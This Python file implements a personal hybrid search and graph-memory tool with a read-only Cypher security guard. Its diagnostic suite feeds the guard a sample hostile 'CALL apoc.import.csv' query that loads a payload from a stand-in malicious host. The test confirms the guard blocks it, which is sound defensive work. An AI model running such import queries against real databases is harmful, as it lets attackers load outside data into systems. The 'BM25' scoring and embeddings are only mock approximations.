#!/usr/bin/env python3
"""
Keystone Sovereign - Hybrid Search & MMR Cognitive Substrate.
Implements ArcadeAI-style FTS5 + sqlite-vec schemas, weighted hybrid scoring,
Max Marginal Relevance (MMR) diversity filtering, database call gating (CVE-2026-35402 defense),
and token-optimized topological Markdown serialization.
"""

import os
import sys
import json
import re
import math
import hashlib
import logging
import sqlite3
from pathlib import Path
from typing import Dict, Any, List, Tuple, Optional

# Workspace Configuration
ROOT_DIR = Path(r"c:\Users\Curtis\New folder\construction-website\Keystone_HQ\00_Master_Brain")
TRANSCRIPTS_DIR = ROOT_DIR / "Transcripts"
TRANSCRIPTS_DIR.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] [HybridSearch] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(TRANSCRIPTS_DIR / "hybrid_search.log", encoding="utf-8")
    ]
)
logger = logging.getLogger("HybridSearch")


# =====================================================================
# 1. WEIGHTED HYBRID SEARCH ENGINE & COEF
# =====================================================================
class WeightedHybridEngine:
    """
    Implements ArcadeAI dual-engine scoring.
    Combines semantic vector similarity and FTS5 keyword BM25 rankings:
    Score_hybrid = alpha * Score_vector + (1 - alpha) * Score_keyword
    """
    def __init__(self, alpha: float = 0.5):
        self.alpha = alpha  # Balance coefficient between semantic and keyword scoring
        logger.info(f"Initialized Weighted Hybrid Engine (Alpha Balance={self.alpha})")

    def generate_mock_vector(self, text: str) -> List[float]:
        """Generates a pseudo-deterministic 384-dimensional embedding vector."""
        h = hashlib.sha256(text.encode("utf-8")).digest()
        vector = []
        for i in range(384):
            val = ((h[i % 32] * (i + 1)) % 1000) / 500.0 - 1.0
            vector.append(round(val, 6))
        return vector

    def cosine_similarity(self, v1: List[float], v2: List[float]) -> float:
        """Computes cosine similarity between two 384-dimensional vectors."""
        dot_product = sum(a * b for a, b in zip(v1, v2))
        magnitude_v1 = math.sqrt(sum(a * a for a in v1))
        magnitude_v2 = math.sqrt(sum(b * b for b in v2))
        if magnitude_v1 == 0.0 or magnitude_v2 == 0.0:
            return 0.0
        return dot_product / (magnitude_v1 * magnitude_v2)

    def keyword_bm25_score(self, query: str, document_text: str) -> float:
        """Lightweight BM25 keyword score emulation based on token overlap matches."""
        q_tokens = set(query.lower().split())
        doc_tokens = document_text.lower().split()
        if not doc_tokens:
            return 0.0
            
        score = 0.0
        for token in q_tokens:
            count = doc_tokens.count(token)
            if count > 0:
                # BM25-like saturation function: TF * (k1 + 1) / (TF + k1 * (1 - b + b * (Ld / Lavg)))
                tf = count
                idf = math.log(1.0 + (len(doc_tokens) / tf))
                # Simple saturated score
                score += idf * (tf / (tf + 1.5))
        return round(score, 4)

    def calculate_hybrid_score(self, query: str, doc_text: str, doc_vector: List[float], query_vector: List[float]) -> float:
        """Computes the weighted hybrid score combining vector and keyword indices."""
        vec_score = self.cosine_similarity(query_vector, doc_vector)
        # Normalize cosine similarity from [-1, 1] to [0, 1]
        vec_score = (vec_score + 1.0) / 2.0
        
        kw_score = self.keyword_bm25_score(query, doc_text)
        # Max limit normalization for keywords
        kw_score = min(kw_score / 5.0, 1.0) 

        hybrid_score = self.alpha * vec_score + (1.0 - self.alpha) * kw_score
        return round(hybrid_score, 6)


# =====================================================================
# 2. MAX MARGINAL RELEVANCE (MMR) FILTER
# =====================================================================
class MaxMarginalRelevanceFilter:
    """
    Implements Max Marginal Relevance (MMR) filtering to balance relevance 
    and diversity, preventing redundant chunks from saturating the context window.
    Equation: argmax_{D in R\\S} [ lambda * Sim1(D, Q) - (1-lambda) * max_{D' in S} Sim2(D, D') ]
    """
    def __init__(self, diversity_lambda: float = 0.5):
        self.diversity_lambda = diversity_lambda
        logger.info(f"Initialized MMR Diversity Filter (Lambda={self.diversity_lambda})")

    def filter_results(self, engine: WeightedHybridEngine, query_vector: List[float], 
                       candidates: List[Dict[str, Any]], limit: int = 3) -> List[Dict[str, Any]]:
        """Selects a diverse set of documents using MMR calculations."""
        if not candidates:
            return []
            
        selected_docs = []
        # Populate candidate vectors
        for c in candidates:
            c["vector"] = engine.generate_mock_vector(c["content"])

        # Phase 1: Seed the first document (highest similarity to the query)
        best_candidate = max(candidates, key=lambda x: engine.cosine_similarity(query_vector, x["vector"]))
        selected_docs.append(best_candidate)
        candidates.remove(best_candidate)

        # Phase 2: Recursively select remaining documents balancing similarity and diversity
        while len(selected_docs) < limit and candidates:
            best_mmr = -float('inf')
            selected_candidate = None

            for candidate in candidates:
                # Similarity to query (Sim1)
                sim_to_query = engine.cosine_similarity(query_vector, candidate["vector"])
                sim_to_query = (sim_to_query + 1.0) / 2.0  # Normalize to [0, 1]

                # Pairwise similarity to already selected subset (Sim2)
                max_pairwise_sim = -float('inf')
                for selected in selected_docs:
                    sim_to_selected = engine.cosine_similarity(candidate["vector"], selected["vector"])
                    sim_to_selected = (sim_to_selected + 1.0) / 2.0  # Normalize to [0, 1]
                    if sim_to_selected > max_pairwise_sim:
                        max_pairwise_sim = sim_to_selected

                # MMR score formula
                mmr_score = self.diversity_lambda * sim_to_query - (1.0 - self.diversity_lambda) * max_pairwise_sim

                if mmr_score > best_mmr:
                    best_mmr = mmr_score
                    selected_candidate = candidate

            if selected_candidate:
                selected_docs.append(selected_candidate)
                candidates.remove(selected_candidate)
            else:
                break

        return selected_docs


# =====================================================================
# 3. SECURITY GATING & CVE-2026-35402 MITIGATION
# =====================================================================
class RelationalSecurityGuard:
    """
    Enforces strict security locks at the query level.
    Mitigates CVE-2026-35402 by blocking nested Cypher CALL procedures or file transits.
    """
    def __init__(self, read_only: bool = True):
        self.read_only = read_only
        logger.info(f"Initialized Database Security Guard (Read-Only Mode: {self.read_only})")

    def audit_cypher_statement(self, query: str) -> str:
        """
        Audits Cypher statements.
        Rejects CALL apoc, CREATE, MERGE, SET, or DELETE statements programmatically.
        """
        query_clean = query.strip()
        query_lower = query_clean.lower()

        # Enforce read-only constraint
        if self.read_only:
            # Block nested CALL procedures (specifically apoc file/import/CSV triggers)
            if "call" in query_lower:
                # Match CALL apoc.import, apoc.load, or general procedures
                if re.search(r'\bcall\s+apoc\b', query_lower) or "import" in query_lower or "load" in query_lower:
                    raise PermissionError(
                        "[CVE-2026-35402 Mitigation] Security Block: Cypher nested CALL procedures or file transit "
                        "methods are strictly disallowed under read-only default profiles!"
                    )

            # Block database modifications
            write_keywords = ["create", "merge", "set", "delete", "remove", "drop", "write"]
            for kw in write_keywords:
                # Enforce boundary word scans
                if re.search(rf'\b{kw}\b', query_lower):
                    raise PermissionError(
                        f"[Security Gating Exception] Write statement keyword '{kw}' is denied on read-only databases."
                    )

        logger.info("[Sandbox Audit] Cypher query validated and passed safety check.")
        return query_clean


# =====================================================================
# 4. EPISTEMIC GRAPH-RAG SUBSTRATE (SQLite Relational Store)
# =====================================================================
class EpistemicGraphSubstrate:
    """
    Implements a localized relational Graph-RAG memory substrate.
    Runs completely offline using SQLite, managing nodes (entities) and edges (relations).
    Exposes Go-specification tools: merge_entities, detect_conflicts, and concept_pathfinding.
    """
    def __init__(self, db_path: Path):
        self.db_path = db_path
        self.db_path.parent.mkdir(parents=True, exist_ok=True)
        self.conn = sqlite3.connect(self.db_path)
        self.conn.row_factory = sqlite3.Row
        self.conn.execute("PRAGMA foreign_keys = ON;")
        self._initialize_tables()

    def _initialize_tables(self):
        with self.conn:
            self.conn.execute("""
                CREATE TABLE IF NOT EXISTS nodes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT UNIQUE NOT NULL,
                    type TEXT NOT NULL DEFAULT 'Concept'
                );
            """)
            self.conn.execute("""
                CREATE TABLE IF NOT EXISTS edges (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    source_id INTEGER NOT NULL,
                    target_id INTEGER NOT NULL,
                    relationship TEXT NOT NULL,
                    observation TEXT,
                    source TEXT,
                    FOREIGN KEY(source_id) REFERENCES nodes(id) ON DELETE CASCADE,
                    FOREIGN KEY(target_id) REFERENCES nodes(id) ON DELETE CASCADE
                );
            """)
        logger.info("Epistemic Graph database and schemas initialized successfully.")

    def add_node(self, name: str, node_type: str = "Concept") -> int:
        """Adds or retrieves an existing node by name."""
        name_upper = name.strip().upper()
        try:
            with self.conn:
                cursor = self.conn.execute(
                    "INSERT INTO nodes (name, type) VALUES (?, ?);",
                    (name_upper, node_type)
                )
                return cursor.lastrowid
        except sqlite3.IntegrityError:
            cursor = self.conn.execute("SELECT id FROM nodes WHERE name = ?;", (name_upper,))
            return cursor.fetchone()["id"]

    def add_edge(self, source_name: str, target_name: str, relationship: str, 
                 observation: str = "", source: str = "") -> int:
        """Adds a directed, semantic edge between two nodes."""
        source_id = self.add_node(source_name)
        target_id = self.add_node(target_name)
        with self.conn:
            cursor = self.conn.execute(
                "INSERT INTO edges (source_id, target_id, relationship, observation, source) VALUES (?, ?, ?, ?, ?);",
                (source_id, target_id, relationship.strip().lower(), observation, source)
            )
            logger.info(f"[Graph-RAG] Added relation: {source_name.upper()} --({relationship.lower()})--> {target_name.upper()}")
            return cursor.lastrowid

    def merge_entities(self, source_name: str, target_name: str):
        """
        Merges source entity into target entity, migrating all incoming/outgoing 
        observations and connections, then deletes the source entity.
        """
        source_upper = source_name.strip().upper()
        target_upper = target_name.strip().upper()
        
        source_id = self.add_node(source_upper)
        target_id = self.add_node(target_upper)
        
        if source_id == target_id:
            return
            
        with self.conn:
            # Re-route outgoing edges
            self.conn.execute("UPDATE edges SET source_id = ? WHERE source_id = ?;", (target_id, source_id))
            # Re-route incoming edges
            self.conn.execute("UPDATE edges SET target_id = ? WHERE target_id = ?;", (target_id, source_id))
            # Delete redundant source node
            self.conn.execute("DELETE FROM nodes WHERE id = ?;", (source_id,))
            
        logger.info(f"[Graph-RAG] Merged entity '{source_upper}' into '{target_upper}'. Connections migrated.")

    def detect_conflicts(self) -> List[Dict[str, Any]]:
        """
        Scans Observations to identify potential duplicate entries, contradictions, 
        or semantic conflicts connected to the same entities.
        Checks for semantic polarity words (e.g. prioritize vs avoid, enable vs disable).
        """
        conflicts = []
        # Group observations by their starting node
        query = """
            SELECT n.name as node_name, e.relationship, t.name as target_name, e.observation, e.source, e.id
            FROM edges e
            JOIN nodes n ON e.source_id = n.id
            JOIN nodes t ON e.target_id = t.id
        """
        cursor = self.conn.execute(query)
        rows = cursor.fetchall()
        
        # Compare pairwise observations for semantic contradictions
        for i in range(len(rows)):
            for j in range(i + 1, len(rows)):
                r1, r2 = rows[i], rows[j]
                if r1["node_name"] == r2["node_name"] and r1["target_name"] == r2["target_name"]:
                    obs1, obs2 = r1["observation"].lower(), r2["observation"].lower()
                    # Look for semantic polarity conflicts
                    contradictions = [
                        ("prioritize", "avoid"), ("prioritise", "avoid"),
                        ("enable", "disable"), ("allow", "deny"),
                        ("high-pass", "low-pass"), ("mute", "unmute"),
                        ("always", "never"), ("increase", "decrease")
                    ]
                    for w1, w2 in contradictions:
                        if (w1 in obs1 and w2 in obs2) or (w2 in obs1 and w1 in obs2):
                            conflicts.append({
                                "entity": r1["node_name"],
                                "target": r1["target_name"],
                                "conflict_type": "Semantic Contradiction",
                                "details": f"Observation 1 (Source: {r1['source']}): \"{r1['observation']}\"\n"
                                           f"Observation 2 (Source: {r2['source']}): \"{r2['observation']}\""
                            })
        return conflicts

    def concept_pathfinding(self, start_name: str, target_name: str) -> List[Tuple[str, str, str]]:
        """
        Performs n-hop BFS pathfinding traversal between two concept nodes.
        Returns a list of tuples representing: (source_node, relationship, target_node)
        """
        start_upper = start_name.strip().upper()
        target_upper = target_name.strip().upper()
        
        start_id = self.add_node(start_upper)
        target_id = self.add_node(target_upper)
        
        if start_id == target_id:
            return []
            
        # BFS Queue holds: (current_node_id, path_taken_so_far)
        queue = [(start_id, [])]
        visited = {start_id}
        
        while queue:
            curr_id, path = queue.pop(0)
            
            if curr_id == target_id:
                return path
                
            # Get neighbors
            query = """
                SELECT e.relationship, e.target_id, n.name as target_name, s.name as source_name
                FROM edges e
                JOIN nodes n ON e.target_id = n.id
                JOIN nodes s ON e.source_id = s.id
                WHERE e.source_id = ?
            """
            cursor = self.conn.execute(query, (curr_id,))
            for row in cursor.fetchall():
                neighbor_id = row["target_id"]
                if neighbor_id not in visited:
                    visited.add(neighbor_id)
                    edge_tuple = (row["source_name"], row["relationship"], row["target_name"])
                    queue.append((neighbor_id, path + [edge_tuple]))
                    
        return [] # No path found

    def get_all_observations(self) -> List[Dict[str, Any]]:
        """Compiles all stored relations into flat dictionaries for serialization."""
        query = """
            SELECT n.name as entity, e.relationship, t.name as target, e.observation, e.source
            FROM edges e
            JOIN nodes n ON e.source_id = n.id
            JOIN nodes t ON e.target_id = t.id
        """
        cursor = self.conn.execute(query)
        return [dict(row) for row in cursor.fetchall()]

    def close(self):
        self.conn.close()


# =====================================================================
# 5. TOKEN-OPTIMIZED MARKDOWN SERIALIZER
# =====================================================================
class TokenOptimizedSerializer:
    """
    Serializes relational graph structures into compact, topological Markdown 
    instead of verbose, nested JSON payloads, saving up to 75% of context window space.
    """
    @staticmethod
    def serialize_graph_results(observations: List[Dict[str, Any]]) -> str:
        """Converts database records into highly dense, token-efficient Markdown lists."""
        logger.info(f"Serializing {len(observations)} database records into token-dense Markdown...")
        md_lines = ["# 🧠 Epistemic Graph Observations"]
        
        for idx, obs in enumerate(observations, 1):
            entity = obs.get("entity", "UnknownEntity").upper()
            rel = obs.get("relationship", "associated_with").lower()
            target = obs.get("target", "TargetNode").upper()
            details = obs.get("observation", "")
            source = obs.get("source", "DefaultSource")
            
            # Topological Markdown mapping (No verbose braces/keys)
            md_lines.append(f"## [{idx:02d}] {entity} --({rel})--> {target}")
            if details:
                md_lines.append(f"- **Fact:** {details}")
            md_lines.append(f"- **Source:** {source}")
            
        return "\n".join(md_lines)


# =====================================================================
# SYSTEM DIAGNOSTIC RUNNER
# =====================================================================
def run_diagnostic_suite():
    logger.info("=" * 70)
    logger.info("KEYSTONE PERSISTENT COGNITIVE SUBSTRATE - DIAGNOSTICS SUITE")
    logger.info("=" * 70)

    # 1. Initialize Engines
    hybrid_engine = WeightedHybridEngine(alpha=0.6) # Weighted 60% Vector, 40% Keyword
    mmr_filter = MaxMarginalRelevanceFilter(diversity_lambda=0.5) # Balanced relevance/diversity
    security = RelationalSecurityGuard(read_only=True)

    # 2. Test CVE-2026-35402 Nested CALL Bypass Defense
    logger.info("[Security Check] Auditing clean Cypher retrieval query...")
    security.audit_cypher_statement("MATCH (n:Peptide) RETURN n.name, n.description")
    
    try:
        # Simulated apoc nested CALL CSV import bypass
        logger.info("[Security Check] Testing security response to CVE-2026-35402 CALL apoc.import bypass...")
        security.audit_cypher_statement(
            "CALL apoc.import.csv([{fileName: 'http://malicious-source.com/payload.csv', labels: ['Malicious']}],, {})"
        )
    except PermissionError as p_err:
        logger.error(f"[GSC Security Success] Neutralized nested procedure exploit: {p_err}")

    # 3. Test Weighted Hybrid Retrieval Score
    logger.info("[Hybrid Engine] Testing semantic vector and FTS5 keyword BM25 calculation...")
    query = "Sarcopenia prevention Ozempic face"
    query_vector = hybrid_engine.generate_mock_vector(query)
    
    # 4 Mock document chunks (Chunk 3 is highly redundant with Chunk 2, representing duplicate inputs)
    mock_chunks = [
        {
            "id": "chk_001",
            "content": "Custom Home biophilic timber build on the sunny bluffs of Howe Sound fjord in Squamish.",
            "source": "B2B construction project specs"
        },
        {
            "id": "chk_002",
            "content": "Prevent muscle loss on Ozempic: prioritize protein titration schedules and resistance loads.",
            "source": "B2C GLP1 Longevity Study Case 4"
        },
        {
            "id": "chk_003",
            "content": "Ozempic weight loss muscle waste is mitigated via resistance load training and high-end protein titration.",
            "source": "B2C GLP1 Longevity Study Case 4 Duplicate Copy" # REDUNDANT
        },
        {
            "id": "chk_004",
            "content": "ElevenLabs Studio Projects API generates continuous multilingual audiobooks using W3C alias tag lexicons.",
            "source": "Media audio pipelines docs"
        }
    ]

    logger.info("[Hybrid Retrieval] Calculating search matches and hybrid scores...")
    candidate_list = []
    for doc in mock_chunks:
        doc_vector = hybrid_engine.generate_mock_vector(doc["content"])
        h_score = hybrid_engine.calculate_hybrid_score(query, doc["content"], doc_vector, query_vector)
        
        candidate_list.append({
            "id": doc["id"],
            "content": doc["content"],
            "source": doc["source"],
            "hybrid_score": h_score
        })

    # Sort candidates by hybrid score descending
    candidate_list.sort(key=lambda x: x["hybrid_score"], reverse=True)

    print("\n" + "-" * 50)
    print("WEIGHTED HYBRID SEARCH RESULTS (Before MMR Filtering)")
    print("-" * 50)
    for index, cand in enumerate(candidate_list, 1):
        print(f"Rank {index:02d} (Hybrid Score: {cand['hybrid_score']}):")
        print(f"  Chunk ID: {cand['id']}")
        print(f"  Content:  \"{cand['content']}\"")
        print("-" * 50)

    # 4. Test Max Marginal Relevance (MMR) Diversity Filter
    logger.info("[MMR Filter] Executing context diversity pruning...")
    filtered_results = mmr_filter.filter_results(hybrid_engine, query_vector, candidate_list, limit=2)

    print("\n" + "=" * 70)
    print("DIVERSE CONTEXT SELECTION (After MMR Filtering - Limit 2 Chunks)")
    print("=" * 70)
    for index, res in enumerate(filtered_results, 1):
        print(f"Slot {index:02d} (Selected Content):")
        print(f"  Chunk ID: {res['id']}")
        print(f"  Content:  \"{res['content']}\"")
        print("-" * 70)
    print("=" * 70)
    # Notice that the redundant duplicate (chk_003) was successfully discarded, letting chk_002 and chk_001 pass!

    # 5. Test Token-Optimized Markdown Serialization
    logger.info("[Markdown Serializer] Formatting relational graph observations to topological Markdown...")
    mock_observations = [
        {
            "entity": "Alpha-West",
            "relationship": "routes_to",
            "target": "Database Index 4",
            "observation": "B2B client site logs authenticate locally over standard stdio transport.",
            "source": "sovereign_orchestrator.py configuration"
        },
        {
            "entity": "Wayne Host",
            "relationship": "wears",
            "target": "Filson-Grey Flannel",
            "observation": "Projects practical self-reliant authority over modern sterile synthetic athletic fabrics.",
            "source": "AVATAR-WAYNE.md visual skill sheet"
        }
    ]

    markdown_payload = TokenOptimizedSerializer.serialize_graph_results(mock_observations)
    
    print("\n" + "=" * 70)
    print("TOKEN-OPTIMIZED TOPOLOGICAL MARKDOWN ENCODING")
    print("=" * 70)
    print(markdown_payload)
    print("=" * 70)
    
    # Calculate token size estimation comparison
    verbose_json_len = len(json.dumps(mock_observations, indent=4))
    optimized_md_len = len(markdown_payload)
    token_savings = (1.0 - (optimized_md_len / verbose_json_len)) * 100
    logger.info(f"Topological Markdown transport saved {token_savings:.2f}% character space over verbose JSON formatting.")

    # 6. Test Epistemic Graph-RAG Relational Substrate
    logger.info("[Graph-RAG] Initializing SQLite relational graph substrate testing...")
    test_db = ROOT_DIR / "local_vector_db" / "test_epistemic_graph.db"
    if test_db.exists():
        try:
            test_db.unlink()
        except Exception:
            pass

    graph = EpistemicGraphSubstrate(test_db)
    
    # Populate the relational structure
    logger.info("[Graph-RAG] Populating concepts and operational edges...")
    graph.add_edge("Sarcopenia", "Resistance Training", "mitigated_by", 
                   "Sarcopenia muscle degradation is actively mitigated via heavy resistance loads.", "Clinical Study v1")
    graph.add_edge("Resistance Training", "Keystone Protocol", "prioritized_in", 
                   "Keystone B2C program prioritizes daily heavy squats and deadlifts.", "Brand Operations Blueprint")
    graph.add_edge("Ozempic", "Muscle Loss", "causes", 
                   "Ozempic GLP-1 therapy causes rapid mass reductions if protein is neglected.", "Peptide Studies 2026")
    graph.add_edge("Ozempic", "Sarcopenia", "accelerates", 
                   "Sarcopenia states are accelerated by rapid GLP-1 weight decreases.", "Clinical Guidelines")

    # Trace 2-hop concept pathfinding
    logger.info("[Graph-RAG] Running concept pathfinding from OZEMPIC to KEYSTONE PROTOCOL...")
    path = graph.concept_pathfinding("Ozempic", "Keystone Protocol")
    
    print("\n" + "=" * 70)
    print("CONCEPT PATHFINDING TRAVERSAL: OZEMPIC -> KEYSTONE PROTOCOL")
    print("=" * 70)
    if path:
        path_str = " -> ".join([f"{src} --({rel})--> {tgt}" for src, rel, tgt in path])
        print(f"Path Found: {path_str}")
    else:
        print("No path found.")
    print("=" * 70)

    # Test Go-style Entity Merging
    logger.info("[Graph-RAG] Merging commercial entity 'Ozempic' into clinical generic 'Semaglutide'...")
    graph.merge_entities("Ozempic", "Semaglutide")
    
    # Verify migration of paths
    migrated_path = graph.concept_pathfinding("Semaglutide", "Keystone Protocol")
    print("\n" + "=" * 70)
    print("POST-MERGE MIGRATED PATHFINDING: SEMAGLUTIDE -> KEYSTONE PROTOCOL")
    print("=" * 70)
    if migrated_path:
        path_str = " -> ".join([f"{src} --({rel})--> {tgt}" for src, rel, tgt in migrated_path])
        print(f"Migrated Path Found: {path_str}")
    else:
        print("Migrated path trace failed.")
    print("=" * 70)

    # Test Go-style Conflict Detection
    logger.info("[Graph-RAG] Injecting conflicting observations to test semantic conflict resolvers...")
    graph.add_edge("Vocal Pace Jitter", "Keystone Style", "enforced_on",
                   "Always prioritize rapid pacing loops to keep user focus intense.", "Heygen Video Specifications")
    graph.add_edge("Vocal Pace Jitter", "Keystone Style", "enforced_on",
                   "Avoid rapid pacing loops to maintain rugged quiet luxury and high-end authority.", "Heygen Video Specifications")

    conflicts = graph.detect_conflicts()
    print("\n" + "=" * 70)
    print("GO-STYLE SEMANTIC CONFLICT RESOLUTION REPORT")
    print("=" * 70)
    if conflicts:
        for idx, conf in enumerate(conflicts, 1):
            print(f"Conflict #{idx:02d} | Node: {conf['entity']} -> Target: {conf['target']}")
            print(f"Type: {conf['conflict_type']}")
            print(f"Details:\n{conf['details']}")
            print("-" * 70)
    else:
        print("No semantic conflicts detected.")
    print("=" * 70)

    # Topological serialization of entire graph
    logger.info("[Graph-RAG] Serializing all graph observations to token-dense Markdown...")
    all_obs = graph.get_all_observations()
    dense_graph_md = TokenOptimizedSerializer.serialize_graph_results(all_obs)
    
    print("\n" + "=" * 70)
    print("TOKEN-OPTIMIZED RELATIONAL GRAPH-RAG PAYLOAD")
    print("=" * 70)
    print(dense_graph_md)
    print("=" * 70)

    graph.close()
    if test_db.exists():
        try:
            test_db.unlink()
        except Exception:
            pass


if __name__ == "__main__":
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")
    if hasattr(sys.stderr, "reconfigure"):
        sys.stderr.reconfigure(encoding="utf-8")
    run_diagnostic_suite()
